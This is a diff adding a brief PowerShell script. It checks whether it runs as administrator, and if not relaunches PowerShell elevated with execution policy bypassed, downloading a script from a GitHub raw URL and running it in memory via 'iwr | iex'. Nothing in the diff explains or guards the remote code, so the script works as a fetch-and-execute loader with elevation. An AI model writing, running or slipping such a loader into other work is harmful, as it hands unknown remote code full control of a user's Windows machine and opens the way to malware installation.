@@ -1,1 +1,11 @@
+# Define the URL where your PowerShell script is hosted
+$scriptUrl = "https://raw.githubusercontent.com/osacarbald/newuplsss/main/menu/og.ps1"  # Replace with the actual URL to your
 
+# Check if the script is running with administrator privileges
+If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    # If not running as administrator, restart the script with admin rights
+    Start-Process powershell.exe -ArgumentList "-NoExit -ExecutionPolicy Bypass -Command `"& { iwr -Uri '$scriptUrl' -UseBasicParsing | iex }`"" -Verb RunAs
+    Exit
+}
+
+Write-Host "Running as Administrator..."
